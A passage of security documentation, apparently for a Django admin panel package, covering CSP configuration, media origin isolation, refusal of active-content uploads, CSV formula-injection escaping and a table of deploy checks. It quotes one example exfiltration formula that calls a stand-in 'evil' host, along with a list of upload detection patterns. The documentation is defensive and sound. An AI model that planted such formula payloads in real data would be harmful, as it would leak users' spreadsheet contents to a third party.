`csp_nonce` itself, because Django 6.1's own CSP middleware already puts a name called
`csp_nonce` in the context and shadowing it with a different type would be a trap for
the next person reading the template. Generate the actual policy with Django 6.0+'s
`SECURE_CSP` / `SECURE_CSP_REPORT_ONLY` settings, or with django-csp; either way,
`check_deploy_csp` (`vantage.W056`) fires if a policy is configured but this context
processor is missing — the panel would render unstyled, or flash light before the
theme script runs.

### The part a nonce cannot reach

A nonce cannot be attached to a `style="…"` attribute or an `onclick="…"` handler —
only to a whole `<script>`/`<style>` element. Those are governed by `style-src-attr`
and `script-src-attr`, which accept only `'unsafe-inline'` or a content hash. A handful
of inline attributes remain in the templates for exactly the cases a nonce cannot
cover, so a policy also needs:

```
style-src-attr 'unsafe-inline';
script-src-attr 'unsafe-inline';
```

`check_deploy_csp_inline` (`vantage.W056`) checks a configured policy for this and
warns if it is missing — the same check id as the nonce-wiring check above, because
both answer "does this project's CSP actually work against this panel", just from two
different angles.

A full policy, assembled from the table:

```python
# settings.py — Django 6.0+
SECURE_CSP = {
    "default-src": ["'self'"],
    "script-src": ["'self'"],       # nonce is added automatically per response
    "style-src": ["'self'"],        # same
    "style-src-attr": ["'unsafe-inline'"],
    "script-src-attr": ["'unsafe-inline'"],
    "img-src": ["'self'", "data:"],
    "font-src": ["'self'"],
    "connect-src": ["'self'"],
    "frame-ancestors": ["'none'"],
    "form-action": ["'self'"],
    "base-uri": ["'none'"],
    "object-src": ["'none'"],
}
```

## Media on a separate origin

The settings screen and every `FileField`/`ImageField` accept uploads, and an uploaded
file is served back from wherever `MEDIA_URL` points. If that is the panel's own
origin, a file that turns out to be misclassified content runs with the session cookie
of whoever opens it — and a logo is on every screen, so that is everyone.
`check_deploy_media_origin` (`vantage.W059`) fires when `MEDIA_URL` is same-origin and
the project has at least one registered `FileField`. Screening at upload time (both the
field-level validators and, if installed, `PanelSecurityMiddleware`'s request-level
check) is the first line of defence; it is not a reason to skip the second one:

- Serve `MEDIA_URL` from a separate host — a subdomain is enough, since the browser's
  same-origin policy is what actually matters here, not the CDN in front of it.
- Or serve media through a storage backend that sets
  `Content-Disposition: attachment`, so a browser downloads a file rather than
  executing it inline whatever its content turns out to be.

## Active content uploads

A plain `FileField` refuses files a browser runs rather than shows — web pages
(`.html`, `.htm`, `.xhtml`, `.xht`, `.shtml`), SVG (`.svg`, `.svgz`), XML (`.xml`, `.xsl`,
`.xslt`) and scripts (`.js`, `.mjs`) — by extension, and HTML or SVG by content
whatever the extension says. A deny-list of dangerous constructs is one clever
encoding away from stored XSS on the panel's origin, so the default does not rely on
one.

A project that needs, say, SVG attachments opts in per extension:

```python
VANTAGE = {"UPLOAD_ACTIVE_SUFFIXES": [".svg"]}
```

An opted-in file is still scanned, after decoding (UTF-16 and UTF-32 included) and
expanding character references, for script elements under any namespace prefix, event
handlers, `javascript:` and `data:` documents, embedded documents and entity
declarations. The same scan guards the four branding uploads and the middleware. A
stored file of one of these kinds — including one uploaded before this rule — is
linked as a download rather than opened in a new tab. Serve media from a separate
origin as well; nothing here replaces that.

## Spreadsheet formulas in exports

A CSV opened in Excel, LibreOffice or Sheets treats a cell that starts with `=`, `+`,
`-`, `@`, a tab or a carriage return as a formula, and a formula such as
`=HYPERLINK("http://evil/?"&A1,"x")` can send other cells off to a stranger. Any text a
user can type is therefore a payload waiting for whoever exports it. The Export button
(CSV and TSV), scheduled report attachments and the import and job error reports all put
a `'` in front of such a text cell. Only text is changed; numbers, dates and booleans
are written as they are, so a negative amount stays a number. NDJSON export is not
changed. A text value that really begins with one of these characters will show the
`'` if the file is imported back. Vantage has no Excel export; one would need the same
rule.

## The `--deploy` checks

Eleven checks, all silent unless the panel is actually mounted (a project that has not
wired `site.urls` into any `urls.py` gets no warnings for a panel it is not running),
all registered with `deploy=True` so they stay out of the everyday `manage.py check` —
a check that is right on a laptop and wrong in production is a check everyone learns to
scroll past.

| ID | Checks |
|---|---|
| `vantage.W050` | `DEBUG = True` with the panel mounted — a traceback page would leak settings, queries and paths to anyone who can trigger a 500 |
| `vantage.W051` | The default cache is a dummy backend (throttle and rate-limit counters count to zero forever) or `LocMemCache` (per-process — N workers means N separate budgets) while login throttling, panel rate limits or `LIST_COUNT_ESTIMATES` are in use |
| `vantage.W052` | Transport gaps in front of the panel: `SecurityMiddleware` missing, `SECURE_SSL_REDIRECT` off, `SECURE_HSTS_SECONDS` at `0`, or `SECURE_CONTENT_TYPE_NOSNIFF` off — one combined warning, deliberately overlapping Django's own `security.W004`/`W006`/`W008` rather than assuming you read those too |
| `vantage.W053` | `SESSION_COOKIE_SECURE`, `SESSION_COOKIE_HTTPONLY` or `SESSION_COOKIE_SAMESITE` left at an insecure default |
| `vantage.W054` | `VANTAGE["IMPORT_MAX_BYTES"]` is falsy (silently falls back to 5 MiB rather than disabling imports, which is probably not what `0` was meant to do) or above 64 MiB, at which point the importer is effectively unbounded — it decodes the whole upload into memory |
| `vantage.W055` | `VANTAGE["AUDIT_LOG"]` is off on a mounted panel — an unrecoverable gap in who-changed-what |
| `vantage.W056` | A CSP is configured but [the nonce context processor](#wiring-the-nonce) is missing, or it does not allow [the inline attributes](#the-part-a-nonce-cannot-reach) the templates emit |
| `vantage.W057` | No `LoginThrottleMiddleware`, and nothing else in `MIDDLEWARE` looks like a throttle (matched loosely against `axes`, `ratelimit`, `throttle`, `defender`, `brute`, so an equivalent third-party package silences this too) |
| `vantage.W058` | No `PanelSecurityMiddleware` — no security headers, no autocomplete/export/import budgets |
| `vantage.W059` | [Media served from the panel's own origin](#media-on-a-separate-origin) while at least one registered model has a `FileField` |
| `vantage.W115` | `REPORTS` is on and `REPORTS_BASE_URL` is unset, so links in [report emails](reports.md#the-email) are built from the `Host` header of the request that created each subscription |
| `vantage.W116` | `AGENTS` is on in production (`DEBUG` off) with neither `SECURE_SSL_REDIRECT` nor `SECURE_PROXY_SSL_HEADER` set, so [agent tokens](agents.md) could travel over plain HTTP |

Two-factor sign-in adds one more in its own range, `vantage.W095`: it is required of
someone while `django.contrib.admin` is mounted without
[`AdminTwoFactorMiddleware`](two-factor.md#djangos-admin).

Run it:

```bash
python manage.py check --deploy
```

Against the demo project as shipped, this reports Django's own transport warnings plus
`vantage.W050`, `W052`, `W053`, `W057` and `W058` — because the example is written to
be read, and turns none of these on. That is the intended demonstration, not a defect
in the example: wiring every one of them into a nine-model demo would bury the parts of
`example/config/settings.py` actually worth reading under boilerplate that belongs on
this page instead.

## See also

- [Two-factor sign-in](two-factor.md) — authenticator-app codes after the password, and how to require them
- [Deployment](deployment.md) — the rest of the pre-launch checklist
- [Permissions](permissions.md) — the model/object/queryset layer these checks sit above
- [Forms](forms.md#media-and-uploads) — the field-level upload validators, thumbnails, and what they refuse
- [Settings](settings.md) — every `VANTAGE` key that *is* in `conf.DEFAULTS`
